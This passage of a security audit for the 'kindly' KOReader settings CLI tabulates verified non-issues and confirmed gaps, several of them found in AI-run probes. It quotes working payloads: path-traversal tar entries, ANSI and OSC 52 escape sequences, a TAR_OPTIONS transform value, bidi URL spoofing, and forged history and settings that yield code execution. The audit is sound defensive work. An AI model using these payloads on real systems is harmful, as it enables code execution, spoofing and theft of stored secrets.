| `setup import` input sources (other-AI Z-probe, attempted) | Full call chain (`commands/setup.ts:1028 runSetupImport → lib/importSetup.ts:349 executeSetupImport → :82-104 loadSetup → existsSync + readFileSync / unpackSetup`) is filesystem-only. Grep for `fetch`, `http.get`, `new URL`, `process.stdin`, `createReadStream`, `"-"` in `src/commands/setup.ts`, `src/lib/importSetup.ts`, `src/lib/setupExport.ts` returns zero hits. Export mirrors via `Bun.write`. Process-substitution `<(cmd)` resolves to `/dev/fd/N` which `readFileSync` handles fine but requires attacker control of the invoking shell — not an SSRF surface | Shipped, verified 2026-04-24 via two-AI Z-probe; no network ingress on import/export path |
| `kindly watch` subprocess trust surface (other-AI HH-probe, attempted) | `src/commands/watch.ts:103-115` reads `.kindly/history.jsonl` only — does NOT touch `settings.reader.lua`, does NOT call apply/classify/restore. Pure push-only `fs.watch` + `JSON.stringify(ev)` stream — no `.replace()` call, no privileged op. TOCTOU between fsevent and read is theoretical but the only output is stdout JSON. Live probe planted a partial-line mid-write; watch correctly dropped it on first scan and emitted the completed entry on next event. The `typeof parsed.index === "number"` guard at `reader.ts:111` silently drops Y-probe-style wrong-type entries (renderer crash doesn't apply — `JSON.stringify` handles any type) | Shipped, verified 2026-04-24 via two-AI HH-probe; watch is passive, no ingestion path, no side-effect on settings/device |
| Environment-variable injection into kindly (DDD-probe, code-audited 2026-04-24) | Exactly **one** `process.env` read in all of `src/`: `process.env.KINDLY_TRACE === "1"` at `src/cli/env.ts:65`, a boolean toggle with no value interpretation. Zero reads of `HOME`, `TMPDIR` (Node's `tmpdir()` is called by `unpack.ts` but that's library-level, not kindly-level), `PATH`, `KOREADER_*`, `NODE_*`, or any attacker-influenceable variable. M-probe (§8.7 companion) flagged the `TAR_OPTIONS` gap which is **env passed to subprocess**, not env read by kindly — different surface, already scoped for fix | Shipped, verified 2026-04-24 via code audit; no env-driven trust surface in kindly itself. The M-probe subprocess-env gap is the only remaining env-related concern |
| `.kindly/trace.jsonl` as a forgeable ingestion surface (FFF-probe, code-audited 2026-04-24) | `src/cli/trace.ts:47` writes one line per invocation via `appendFileSync` (implicit `flag: "a"` → O_APPEND, no interleave). **No read path exists**: grep for `readFileSync.*trace\.jsonl\|parseTrace\|readdirSync` on `trace-archive/` returns zero hits across `src/`. No renderer, no validator, no consumer. The file is strictly write-only telemetry for the maintainer's self-dogfooding (docstring: "strictly for Claudiu to measure his own friction"). Race-free by design: no index computation (unlike history.jsonl's writer.ts:148-149 race — EE-probe gap). `argv` is hashed with sha256[:12], never stored raw — no secret-leak via trace content | Shipped, verified 2026-04-24 via code audit; trace.jsonl has no trust-exploitable surface. One minor note folded into §8.9: `.kindly/` chmod 0700 covers this file too — an attacker with read on `.kindly/trace.jsonl` still learns invocation-time correlation data (which commands ran, when, how often), which is covert-channel-adjacent but not a new gap |
| `kindly plugin` subcommand — attacker-controllable install surface (QQ-probe, code-audited 2026-04-24) | `src/commands/plugin.ts` exposes only `list` + `describe <name>` — both read-only. Dispatcher at `:290`, wired at `cli.ts:47`. No `install`/`remove`/`add`/`import`/`copy` subcommand exists. FS reads: (a) bundled catalog JSON at `data/catalog/plugins.bundled.v1.json` (`:50`) — resolved inside kindly install dir, not user-supplied; (b) best-effort `settings.reader.lua` read for enabled/disabled computation (`:41-45`). Zero device writes, zero path flow to `mount.koreaderRoot/plugins/`. The S42 `extra_plugin_paths` concern is unreachable through this subcommand | Shipped, verified 2026-04-24 via two-AI QQ-probe; `plugin` is a trust-boundary-free catalog browser. Any future `plugin install` subcommand must attach the same SENSITIVE/catalog/W31a dual-gate that `extra_plugin_paths` carries |
| Unicode `..` variants in tar entry names — filesystem traversal (WW-probe, code+live-audited 2026-04-24) | `isSafeRelativePath` (`src/fs/paths.ts:10-20`) rejects segments byte-equal to ASCII `..` only. Accepts `﹒﹒` (U+FE52), `․․` (U+2024), `．．` (U+FF0E), and NBSP/ZWSP-separated `. .`. Live probe on macOS bsdtar 3.5.3: all variants extract as literal directory names (`dest/﹒﹒/main.lua`) — kernel/libc never NFKC-normalize path components; only the `0x2E` byte is special. No filesystem-level escape | Shipped, verified 2026-04-24 via two-AI WW-probe; predicate is technically under-specified but gap not exploitable via tar traversal. Adjacent hazard: these filenames may survive round-trips through higher-layer code that **does** normalize (filename dedup, NFC-aware duplicate detection) — spoofing risk in doctor/pull renderers, out of scope for bomb-path defense but worth tracking for §8.3/§8.10 string hygiene |
| GNU `@LongLink` divergence between `listTarGz` and `extractTarGz` on bsdtar (XX-probe, live-audited 2026-04-24) | `archive.ts:219` (`tar -xzf`) vs `:233` (`tar -tzf`) both run bsdtar 3.5.3 on macOS. Hand-crafted tars with GNU `@LongLink` (typeflag `L`) preceding a ustar file header: Variant A (LongLink body = `safe/…/innocuous.lua`, ustar short name = `../../../tmp/PWNED.lua`) extracts under the LongLink name, list and extract agree. Variant B (inverse) is correctly rejected by `isSafeRelativePath` since `..` appears in listing | Shipped, verified 2026-04-24 via two-AI XX-probe on macOS. **Caveat:** probe did not run GNU tar on Linux. M-probe's Linux/`TAR_OPTIONS` gap is the canonical Linux tar concern and remains flagged. When kindly adds a Linux target, re-probe `@LongLink` on GNU tar — historical edge-cases (negative checksum, out-of-order headers) may still cause listing/extraction divergence that bsdtar doesn't |
| Multi-document YAML as a smuggle vector (S86, TTT-probe, attempted) | `yaml@2.8.3` throws `Source contains multiple documents; please use YAML.parseAllDocuments() at line N, column 1` on any `---`-separated input. `parseYamlSafe` inherits the throw at `yamlSafe.ts:42`. Confirmed against plain multidoc, `%YAML 1.1` + multidoc, and cross-doc anchor references (`&evil` in doc 1, `*evil` in doc 2) — all three fail at parse-time. No attacker primitive | Shipped, verified 2026-04-24 via SSS/TTT probe; multi-doc YAML is error-path only. Forward-looking note: yaml's error message literally names the escape hatch (`parseAllDocuments()`) — any future kindly feature adopting multi-doc manifests must pass each sub-doc through the full classifier chain, and must handle cross-doc anchor resolution explicitly (yaml resolves anchors across docs when the loader permits) |
| Lua scanner regex ReDoS / catastrophic backtracking (QQQ2-probe, attempted) | `luaScan.ts:88,96,121,127` regex shapes audited: all `\s*\(\s*` are bounded-quantifier sequences anchored by literal parens (no overlap with a following literal), alternations are fixed-length literal module names (no disjoint-prefix backtracking), `[^"']+["']` class+delimiter sets are disjoint so no quadratic scan on pathological input. `stripImpl` at `:154-238` is a single-pass state machine that strictly advances `i` on every branch (no re-scan windows). Worst-case benchmarked: 1.3 MB input with 50k deeply-nested comments + string-long-bracket mix → 25.6 ms end-to-end (0.02 ms/KB); 10 MB worst-case projects to ~200 ms — under the 1 s human-perception threshold | Shipped, verified 2026-04-24 via third-AI QQQ2-probe; scanner is linear-time safe. No bomb defense needed at the regex layer. `stripCommentsOnly`'s escape-emit gap is a correctness bug (S82) not a DoS vector |
| `backupRotation` race between concurrent `safeWrite` backups (EEE-probe, code-audited 2026-04-24) | `src/fs/backupRotation.ts:10` reads `readdirSync(dir)` → sorts lexicographically by ISO-millisecond stamp → `slice(-keepN)`. Concurrent rotators both see the full sorted listing at call time and converge on the same "keep newest 20" slice; no entry-level race. `rmSync({recursive:true, force:true})` on removed dirs follows POSIX unlink semantics — a symlink target is not followed for removal in Node ≥16. Symlink replacement of `.kindly/backups` is out-of-trust-model (requires attacker cwd control — S61 / S56 already cover that class). One residual wart: same-millisecond ISO stamp collisions between two `safeWrite` calls silently overwrite one pre-write archive (`mkdirSync({recursive:true})` + `copyFileSync` is idempotent on the dir but not on the file content). Lost-backup primitive of single-write granularity; low severity because the `.old` sibling still exists for one-step recovery | Shipped, verified 2026-04-24 via code audit; rotation is race-benign. The stamp-collision wart is documented but not a new gap — folded into S67's file-lock scope since adding a lock around safeWrite would serialize stamp creation incidentally |

## 4. Confirmed gaps (post-S3)

| Gap | Why it exists | Current mitigation |
|-----|---------------|--------------------|
| Scanner evaded by byte-table string assembly | Lexical, not dataflow; spec §2.2 known limitation | Reviewer, or `--strict-imports` if plugin is catalogued |
| Uncatalogued plugin + `--accept-plugins` (no strict) = trust-by-accept (S3) — **live-verified 2026-04-23** | Strict is opt-in, default accept-plugins path allows uncatalogued | None today — S3 exploits this; confirmed on KOReader/macOS: plugin `:init` ran on boot, `POST /s3` landed at `127.0.0.1:5353` with 14,351 bytes of real settings body |
| Patches are not catalog-verified | No catalog to verify against (patches are by definition custom) | Scanner (also evadable) |
| **Patch-in-MATCH bypasses full strict mode** (S4) — **live-verified 2026-04-23** | Patches have no trust tier; scanner is sole gate and is evadable | **None today — S4 is an open hole even under `--strict-imports`; confirmed on KOReader/macOS: patch loaded on boot, marker file written, POST body transited to local listener at 4242** |
| **ANSI/control-char injection in author / source / description** (S7 / S40) — **live-verified 2026-04-23** | `MetaSchema` fields are bare `z.string().optional()` (schema.ts:88-99); `renderImportAuthorBlock` writes them verbatim to stdout (setup.ts:725-740) | **None today — S40 demonstrated the full forgery: YAML `\x1b`-escape in `meta.author` uses `\r` + bold-green + `\x1b[K` to paint `(VERIFIED ✓ community-catalog-v1)` over the `(UNVERIFIED)` suffix. Hex-confirmed bytes: `0d 1b 5b 31 3b 33 32 6d … 1b 5b 30 6d 1b 5b 4b`. Chains with S4 to produce bold-green "VERIFIED" next to a silent patch install** |
| **`terminal_shell` settings-only code-exec** (S9) | Missing from `SENSITIVE_KEYS`; W31 gate never fires | None today — imports silently at exit 0 |
| **`kindly apply --file` bypasses the SENSITIVE gate entirely** (S38) — **live-verified 2026-04-23** | W31 wired only into `setup import`; `apply` runs `mergeYamlIntoLua` directly with no trust boundary | **None today — plain YAML (no manifest, no flags) lands SENSITIVE settings silently at exit 0; confirmed on KOReader/macOS: `Terminal: spawning shell /tmp/kindly-s38-live/probe.sh`, `GET /s38` 200 at listener, marker 7s after launch.** Broadest single surface: re-widens every other SENSITIVE-keys gap through the apply path |
| **`apply` + `extra_plugin_paths` = universal plugin injection** (S42) — **live-verified 2026-04-23** | Same root cause as S38, but this key is **dual-gated** under `setup import` (W31a); apply flattens the dual gate to zero | **None today — strongest primitive in the red-team: plain YAML + arbitrary filesystem path with a `.koplugin` dir = arbitrary Lua on KOReader boot. Confirmed: `Looking for plugins in directory: /tmp/kindly-s42-live/evil-plugins`, `s42evil: init fired`, marker 4s after launch. Bypasses `.kset` archive checks (W34b), catalog (W32), scanner, and both accept-flags** |
| **`apply` has no SECRET filter — overwrite + stdout leak** (S43) — **live-verified 2026-04-23** | `filterForYaml` runs on pull and setup-import only; `src/lib/apply.ts` imports nothing from classify.ts; diff renderer prints `prev → next` unredacted | **None today — plain YAML (a) silently overwrites `zlibrary_password`, `calibre_wireless_password`, `pinpadlock_pin_code`, `LocalSend_pin`, `kosync.userkey`, and `pinpadlock_message` (recovery-channel hijack), and (b) `apply --dry-run` stdout prints every victim plaintext in the diff lines — self-exfil surface for any user who screenshots / pastes / `tee`s output** |
| **`kindly rollback <attacker-dir>` = unverified settings+plugins+patches ingestion** (S44) — **live-verified 2026-04-23** | Rollback imports nothing from classify.ts; `extractTarGz` does size-cap + path-safety only, no hash/catalog/scanner; command accepts any directory path | **None today — single command delivers settings overwrite + arbitrary plugin + arbitrary patch in one go, no flags. Confirmed: settings + `s44evil.koplugin` + `2-autorun.lua` extracted, plugin `init` fired, marker + `GET /s44` 200 4s after KOReader launch. Command output says `✓ restored 3 plugin/patch file(s)` — "restored" is misleading** |
| **`kindly restore <attacker.tar.gz>` = fat-tar RCE in one command** (S46) — **live-verified 2026-04-23** | Same root cause as S44, but a single `.tar.gz` attack artifact instead of a directory; `restore` is framed as *undoing harm*, which mis-primes the user | **None today — zero flags, exit 0, `✓ restored 4 file(s)` output. Marker + `GET /s46` 200 4s after KOReader launch. Dry-run shows all entries but caps at 50 — real snapshots with 6+ plugins bury the evil one** |
| **Snapshot-as-distribution: kindly's own tooling is the attack framework** (S47) — **live-verified 2026-04-23** | `kindly snapshot` blindly tars `plugins/` + `patches/` with no "code from unknown origin" concept; tar carries no trust-tier metadata; `kindly restore` cannot distinguish self-authored from forum-sourced snapshots | **None today — attacker pipeline is `kindly snapshot` → share on forum as "my reading setup" → victim `kindly restore`. Full chain verified: attacker fixture with `s47evil.koplugin` → `kindly-snapshot-<ts>.tar.gz` (only warning is about plaintext secrets — a non-issue for attacker) → clean victim fixture → plugin fires 4s after KOReader launch, marker + `GET /s47` 200** |
| **`--json` envelope carries SECRET plaintexts on apply/diff** (S48) — **live-verified 2026-04-23** | `computeChanges` (diff.ts:46) operates on unfiltered on-device data; `json.ts:82` serializes the full result tree with no classify lookup; `DiffResult.grouped` emits each change twice | **None today — 5/5 victim plaintexts in stdout of both `apply --dry-run --json` and `diff --json`. CI/cron pipes that request `--json` land values in structured log stores (Splunk/Datadog/S3). Worse than S43b/S45: automation is the default consumer of JSON output, and double-emission via `grouped` survives most JSON path filters** |
| **Restore-path code-exec surface spans ≥5 files, not 2** (S49) — **live-verified 2026-04-23 (defaults.custom.lua); static-confirmed for history.lua, settings.reader.lua.old** | KOReader loads settings files via `pcall(dofile, …)`; every Lua file in `SNAPSHOT_PATHS` is a code-drop surface, not just `plugins/` + `patches/` | **None today — minimal attacker tar (`settings.reader.lua` + `defaults.custom.lua` only, no plugin, no patch) delivered code-exec via `kindly restore`. Marker in 2s (faster than plugin-based because `LuaDefaults:open` runs early in startup). §8.7 HMAC gate scope must cover the full tar, not just plugins/patches specifically** |
| **Symlink entries in restore tars bypass path-safety** (S50) — **live-verified 2026-04-23** | `isSafeRelativePath` validates entry paths only, not symlink targets; `listTarGz` uses `tar -tzf` which hides file types; BSD tar extracts symlinks as symlinks with target intact | **None today — `kindly restore` is an arbitrary-symlink-creation primitive inside the victim's filesystem. Cross-install exfil via bridged `settings.reader.lua` → another install's settings file confirmed live: `kindly diff` prints `"/home/someone-else" → "…"` as `prev` value; `kindly pull --full` landed bridged non-SECRET keys in output YAML. SECRET filter catches credentials accidentally (filterForYaml runs regardless of backing storage). Moderate severity: info-disclosure + invariant break, not RCE** |
| **`kindly rollback <attacker-dir>` = fourth tar-ingestion RCE** (S51) — **live-verified 2026-04-23** | `rollback.ts:73` resolves `snapshotDir` against env.cwd with no `.kindly/` anchor; entry-name `isSafeRelativePath` passes plain `plugins/foo.koplugin/*.lua`; `extractTarGz` unpacks into `mount.koreaderRoot`. History-jsonl read in `findHistoryEntryByIndex` trusts every line verbatim (no HMAC), so `rollback --to <N>` inherits the same primitive when an attacker can forge one history line | **None today — `kindly rollback /tmp/attacker-snapshot-dir --mount …` delivered `evil.koplugin` to koreaderRoot at exit 0 with `✓ restored 2 plugin/patch file(s)`. Marker + `GET /s51` 200 at 2s after KOReader launch. Broadens the §8.7 fix surface: must anchor `snapshotDir` to `<cwd>/.kindly/{pre-*}/` AND HMAC-sign history.jsonl lines** |
| **Lean `.kset` chain: re-enable Terminal via `plugins_disabled.terminal=false` + set `terminal_shell`** (S17) — **live-verified 2026-04-23** | `settings:` is a permissive `z.record`; `plugins_disabled` writes bypass `PluginsSchema`'s disable-only intent via shallow-merge | **None today — full driveby under `kindly setup import` with zero flags; confirmed on KOReader/macOS: `Terminal: spawning shell /tmp/pwn.sh`, listener hit, PTY allocated** |
| **`plugins_disabled.<name>: false` re-enables *any* built-in plugin silently** (S27) | `plugins_disabled` not in SENSITIVE_KEYS; generic primitive, not per-plugin | Exit 0, silent. SSH / LocalSend / httpinspector / calibre / wallabag / opds all re-enable |
| Type-mismatch values for known-typed keys (S20) | Schema validator warns, does not block; diff renderer prints live SECRET values during overwrite preview | Warn-only (exit 4). Info-leak requires user to paste dry-run output |
| Directory-redirection settings keys not in SENSITIVE (`screenshot_dir`, `screensaver_dir`, `wikipedia_save_dir`, `cover_image_path`, `cover_image_fallback_path`, `cover_image_cache_path`) | Consistency gap vs. existing `home_dir`/`download_dir`/`inbox_dir` coverage | None today — follow-up audit |
| Scanner runs only on declared file set | `.kset` manifest enumerates files; extras outside manifest would be refused earlier, but a determined malicious export tool could race | Archive path-safety (W34b) |
| **`.kindly/` state world-readable; SECRETs in backups** (S53, other-AI J-probe 2026-04-23) | `safeWrite.ts:76/85`, `history/writer.ts:143/169` etc. use `mkdirSync`/`openSync` with process umask (default 022 → 755/644). Zero `chmod`/`umask` calls in all of `src/`. `.kindly/backups/<ts>/settings.reader.lua` is a byte-copy of device state = plaintext SECRETs (`filterForYaml` NOT run on backups). `.kindly/history.jsonl` also world-readable | **None today — any local user with read on cwd harvests SECRETs from `.kindly/backups/*/settings.reader.lua` (plaintext passwords, PINs, API keys) and the full mutation audit from `history.jsonl`. `CLAUDE.md` scopes kindly as single-user but this is still porous: admin+regular-user shared macOS boxes, background sync daemons under other UIDs, Spotlight/LSP sandboxed processes. Fix is §8.9: `chmod 0700 .kindly/`, `chmod 0600` on every file inside** |
| **`setup export` missing producer-side "shipping executable code" warning** (audited 2026-04-23, lower severity than S47) | `setup.ts:133-176` renders bytes / file counts / hash but does NOT warn that plugin + patch files execute on importers' KOReaders. Mirror of S47's snapshot gap. Different severity profile: import side has strict-mode scanner + W32 catalog + `--accept-plugins` gate (stronger than restore's zero-gate ingestion) — but those gates are evadable (S3/S4) | **None today — producer warning absent.** Chain: compromised Victim A exports `.kset --include-plugin-files` unaware of attacker plugin, shares on forum, importers get UNCATALOGUED advisory + evadable scanner + `--accept-plugins` click-through. Lower severity than S47 because of the gate stack, but producer-side nudge still worth adding: `"archive ships N plugin file(s) + M patch file(s) — all executable Lua. Don't share with anyone you wouldn't trust to run code on your device."` |
| **Plugin catalog case-collision bypasses hash verification on APFS/vfat** (S58, other-AI T-probe, live-confirmed 2026-04-24) | `src/lib/verify.ts:68-69` compares plugin names with strict `===` (case-sensitive). APFS (macOS default) and vfat (Kindle USB) are case-insensitive at the filesystem layer. Attacker ships `plugins/ssh.koplugin/main.lua` (lowercase); catalog stores `"SSH"`; lookup misses → UNCATALOGUED verdict; hash verification never runs | **None today under non-strict `--accept-plugins`.** Attacker's `ssh.koplugin/main.lua` extracts on top of user's real `SSH.koplugin/` (same directory on APFS/vfat) and silently overwrites it. Affects ~half the bundled catalog (any non-all-lowercase entry). Under `--strict-imports`: blocked (UNCATALOGUED is non-MATCH). Fix: case-insensitive catalog lookup, or emit NAME_CASE_MISMATCH verdict explicitly |
| **Non-table top-level `return "str"` silently corrupts settings via kindly downstream** (S59, live-verified 2026-04-24) | `src/lua/reader.ts:101-116` (`parseFile`) returns `LuaValue` not `LuaTable`. `luaToYaml` + `mergeYamlIntoLua` (both in `src/schema/yaml.ts`) accept a bare string and iterate characters as numeric keys — zero type-check | **None today.** Post-poisoning (via S38/S42/S43/S44/S46/S51), attacker plants `return "evil"`; victim's `kindly pull` emits 400 lines of `"0": j\n"1": u\n…`; next `kindly apply` writes character-soup back to device. Legitimate settings structurally erased, zero error surfaced. Fix: `parseSettingsFile` rejects non-plain-table top-level |
| **`parseSettingsFile` stack overflow on deep nesting (~50k depth)** (S60, live-verified 2026-04-24) | `parseTable` recurses through `parseValue` per entry; V8 call-stack limit blown at ~30-50k depth (450 KB file). Attack file fits easily inside the 100 MB archive cap | **None today.** One poisoned settings.reader.lua kills every kindly command that calls `parseSettingsFile` (pull/diff/apply/doctor/rollback/restore/setup-import). Recovery requires direct filesystem edit. Push-button DoS of the whole user surface — including `kindly watch` subprocess powering the docs/97 GUI vision. Fix: recursion-depth cap (64) at `parseValue` entry |
| **`--output` paths accept absolute/traversal/symlink writes; `snapshot --output` = secondary-channel SECRET leak** (S61, audited 2026-04-24 — low severity) | Four user-controlled outputs use `resolve(env.cwd, opts.output)` with no path-safety: `init.ts:43`, `lib/pull.ts:42`, `snapshot.ts:57-59`, `lib/setupExport.ts:182-183`. `writeFileSync` follows symlinks; `--force` suppresses existsSync. `snapshot` writes a plaintext-SECRET fat tar; others write SECRET-filtered or hardcoded content | **None today** (self-inflicted for the user-typed flag). Non-self-inflicted concern: `kindly snapshot --output /tmp/public/foo.tar.gz` lands plaintext SECRETs in a shared-readable location — secondary S53 channel. Fix: `chmod 0600` on output regardless of location (§8.9), plus `--output` warning when resolved path escapes cwd |
| **`kindly doctor` ANSI injection via plugin-dir names and unknown settings keys** (S55, live-verified 2026-04-23) | `src/lib/doctor.ts:217` (unknown-keys `sample.join(", ")`) and `:361/380-381` (uncatalogued plugin names `sort().join(", ")`) both flow to stdout with zero C0/C1 sanitization. `isSafeRelativePath` (`src/fs/paths.ts:10-20`) permits all bytes except null, leading `/`, `\`, and `..` — so ESC 0x1B in tar entry names passes the path check and extracts cleanly | **None today — live probe wrote `plugins/\x1b[31;1mEVIL.koplugin/main.lua` and ran `kindly doctor --mount …`; `cat -v` output showed literal `^[[31;1m` bytes in the uncatalogued-plugin detail line.** Chain with S46 (`kindly restore`): attacker tar delivers ANSI-named plugin → victim runs doctor *precisely because something feels off* → doctor output fake-greens fraudulent integrity via `\r\x1b[K` overpaint. Same injection repeats via `history.ts:112-117` on attacker-written `e.label` (S53 chain). Folds into a new §8.10 (shared stdout sanitizer) or extends §8.3 |
| **Mount-side symlink on `settings.reader.lua` = cross-read + covert destruction** (S56, other-AI P-probe 2026-04-23) | Eight read-sites use plain `readFileSync` on `mount.settingsPath` — no `lstatSync` guard: `src/lib/pull.ts:36`, `diff.ts:35`, `apply.ts:40`, `doctor.ts:88`, `setupInspect.ts:168`, `importSetup.ts:549`, `commands/plugin.ts:42`, `commands/rollback.ts:140-143`. Only `unpack.ts:86,126` lstat-checks, and that is the archive-extract path (S50 scope) | **None today.** Attacker plants symlink `Kindle/koreader/settings.reader.lua → ~/.config/koreader/settings.reader.lua` (sibling install / other-user path / `/etc/passwd`). `pull`/`diff`/`doctor` read through and emit bridged content; `apply` replaces the symlink with a regular file (covert destruction — evidence of the bridge vanishes, legitimate Kindle settings also vanish). S50 sibling on the primary-read path. Fix: `lstatSync(path).isSymbolicLink()` reject at all 8 sites |
| **`setup import --dry-run` / `--json` leaks SENSITIVE values (but not SECRETs)** (S57, other-AI Q-probe 2026-04-23) | `renderSetupImport` at `setup.ts:941-951` prints `fmtValue(c.prev) → fmtValue(c.next)` raw for every change including `[SENSITIVE]`; `fmtValue` at `:682` has zero redaction; SENSITIVE gate at `importSetup.ts:605` explicitly skipped when `opts.dryRun`; `publicData.changes` at `:1066` carries raw LuaValues; `formatSensitiveChange` at `importSetup.ts:594-603` builds strict-mode error messages from the same `fmtValue` | **None today.** SECRETs are cleanly filtered (filterForYaml at importSetup:543, replace-mode preservedKeys at :553-558). SENSITIVE values — `ota_server`, `http_proxy`, `extra_plugin_paths`, SSH surface — leak via: (a) `--dry-run` human stdout, (b) `--json` envelope `publicData.changes`, (c) strict-imports error message on stderr. Dry-run gate bypass is itself a design error. Fix: widen §8.4's redactor to SENSITIVE + SECRET; run the SENSITIVE gate even on `dryRun=true` |
| **Unfiltered env passed to `tar` child process; `TAR_OPTIONS` bypasses path-safety on GNU tar / Linux** (M-probe, 2026-04-23 — defense-in-depth gap) | `archive.ts:64, 219, 233` all call `spawnSync("tar", args, { encoding: "utf8" })` with **no `env` option** — full `process.env` inherits. On macOS bsdtar (libarchive 3.7.4), `TAR_OPTIONS` is not read (verified: bogus flag silently dropped; only `TAPE` is honored). On **GNU tar (Linux)**, `TAR_OPTIONS` *is* read and `--transform='s,.*,koreader/plugins/evil.koplugin/main.lua,'` rewrites entry paths **at extraction time, after `isSafeRelativePath` already validated the original listing from `tar -tzf`**. `listTarGz` and `extractTarGz` disagree on what paths they see | **None today on Linux; macOS not exploitable.** Kindly's intended execution host is the user's desktop (macOS confirmed; Windows unsupported; Linux is the natural third target). The moment kindly runs on a Linux box, this is a silent bypass of every path-safety check in §8.7. Fix is trivial and defense-in-depth-friendly: `spawnSync("tar", args, { env: {}, encoding: "utf8" })` on all three sites, OR explicitly drop `TAR_OPTIONS`/`TAR_READER_OPTIONS`/`TAPE`/`LANG`/`LC_*` from the inherited env. Folds into §8.7 as a mandatory companion fix |
| **`kindly pull --full` emits EPHEMERAL PII with no warning** (S62, live-verified 2026-04-24) | `--full` flag includes EPHEMERAL keys per classify.ts:130-156. Several of those carry literal PII: `lastfile` (filesystem path), `lastdir` (folder hierarchy), `menu_search_string` (search queries), `quote_deck_pos`, `LocalSend_last_update_check`. No tag, no warning, single-line success message on exit 0 | **None today — self-inflicted but mis-priced.** `--full` mental model is "include more keys"; actual semantic is "include more keys **including PII**". Framing gap makes forum-paste / bug-report disclosure likely. Fix: split EPHEMERAL into `EPHEMERAL_VOLATILE` (safe) + `EPHEMERAL_PII` (paths/queries); `--full` = volatile only; new `--full-pii` gate for PII tier; stderr warning listing PII keys at write time; writeFileSecure chmod 0600 inherited from §8.9 |
| **Forged `history.jsonl` + `rollback --to N` = attacker-Lua on device** (S63, live-verified 2026-04-24) | `src/history/reader.ts:70` casts each JSONL line with `as HistoryEntry` (no Zod validation). `rollback.ts:268` does `dirname(s.backup_path)` verbatim — no HMAC, no `.kindly/` path constraint. Plus `history.ts:110` `e.ts.replace(…)` crashes on non-string `ts` (Y-probe) so the natural reconnaissance command is DoS-able alongside the primitive | **None today — single appended line to `.kindly/history.jsonl` + `kindly rollback --to 1` lands attacker Lua on-device. Probe confirmed: `rollback from /tmp/kindly-dd-live/attacker-backup` → `ATTACKER_FORGED_KEY = "DD_PROBE_LANDED"`, `terminal_shell = "/bin/sh"` in fixture. Severity sibling to S51 but with lower social-engineering friction (user types index, not path). Fix: Zod HistoryEntrySchema.strict() with path constraint to `<cwd>/.kindly/`, HMAC-sign each history line, render-time type guards on `e.ts` |
| **`plugins_disabled` as YAML array silently re-enables every disabled plugin** (S64, AA-probe, live-verified 2026-04-24) | `plugins_disabled: [SSH, terminal]` (YAML list) hits `mergeYamlIntoLua` (src/schema/yaml.ts:108-128) where object-vs-array type mismatch triggers wholesale replace (no sub-merge). Lua writer emits integer-keyed `{[1]="SSH",[2]="terminal"}`; KOReader's `plugins_disabled[plugin_name]` string-key lookup returns nil on an integer-keyed table → every previously-disabled plugin re-enables | **None today — one YAML line, no flags, exit 0. Stronger than S27 (which flips one key): S64 flips *all* disabled plugins including terminal (S17 primitive), SSH, httpinspector, LocalSend, calibre, wallabag, opds. §8.1's proposed `value === false` check (inspects map values) structurally cannot catch array form. Fix: reject non-plain-object `plugins_disabled` with `plugins_disabled must be a map of name → bool, got array` |
| **Unicode bidi / RTL-override in manifest identity fields bypasses §8.3** (S65, II-probe, live-verified 2026-04-24) | `meta.author`/`description` are bare `z.string().optional()`; `meta.source_url` is `z.string().url()` — but **`.url()` accepts U+202E inside path/host** (live-verified: `https://github.com/anthropic-kindly‮gro.reliove.cdn` validates clean). §8.3's proposed C0/C1 sanitizer (0x00-0x1F + 0x80-0x9F) is scoped below codepoint 0x2000 — U+202E at 0x202E is above that range and passes | **None today — on bidi-aware TTY, spoofed `source_url` renders `https://github.com/anthropic-kindlyndc.evoiler.org (UNVERIFIED)` *at the moment of trust-granting* (setup.ts:718-741). W33's "display but mark UNVERIFIED" strategy structurally broken when displayed bytes ≠ attacker bytes. Fix: extend §8.3 sanitizer to strip Unicode bidi block U+202A-202E, U+2066-2069, U+200E-200F. Single `sanitizeIdentityString` helper shared with S7/S40** |
| **OSC 52 clipboard-write injection via plugin dir names / `setup inspect` meta / `history` labels** (S66, VV-probe, live-verified 2026-04-24 at byte level) | Zero control-char sanitization on filesystem-sourced strings: `src/lib/doctor.ts:381` (uncatalogued plugin basenames), `src/commands/setup.ts:280-293,718-741` (meta.author/description), `src/history/writer.ts:163` (labels stored raw in JSONL) + history renderer. OSC 52 (`\x1b]52;c;<base64>\x07`) passes verbatim to stdout; iTerm2/kitty/most xterm variants honor it and silently write the decoded base64 to the system clipboard | **None today — silent clipboard-write. Severity high when chained with S65: `setup inspect` renders spoofed-looking GitHub URL while writing `kindly setup import /tmp/attacker.kset` to the clipboard; user pastes the attacker command thinking it's benign. Fix: shared `stripControl` at §8.10 covering filesystem-sourced strings (plugin names, key names) not just manifest identity — must include ESC (0x1B) so OSC/DCS/CSI all get caught. JSON emitter must pre-sanitize (not rely on `JSON.stringify` escaping) since `cat` of the logged JSON still honors the bytes** |
| **No file-lock on `settings.reader.lua`; lost-write race on desktop/emulator live-head target** (S67, UU-probe, live-verified 2026-04-24) | `src/fs/safeWrite.ts` is atomic per write, not per read-modify-write. `mergeYamlIntoLua` reads then writes with no coordination — grep `flock\|lockfile\|lockSync\|LOCK_EX` across `src/` returns zero hits. USB-mount-gate invariant (KOReader off while kindly runs) holds for Kindle but is **violated for the macOS KOReader-on-desktop live-head** target adopted per `project_kindly_koreader_live_head` memory | **None today — silent lost-write in either direction. Live probe (3000-iteration writer loop + 5 concurrent `kindly apply`): final state had `cover_image_quality = 10` (kindly's 75 overwritten) AND `koreader_write_iter = 3000` (writer's last iter preserved). No warning, exit 0. Severity MEDIUM on desktop/emulator (docs/97 GUI vision makes this explicit), LOW on Kindle. Fix: advisory `flock(fd, LOCK_EX)` spanning read-modify-write, or `proper-lockfile` sidecar. Long-term: upstream KOReader to honor the same lock** |
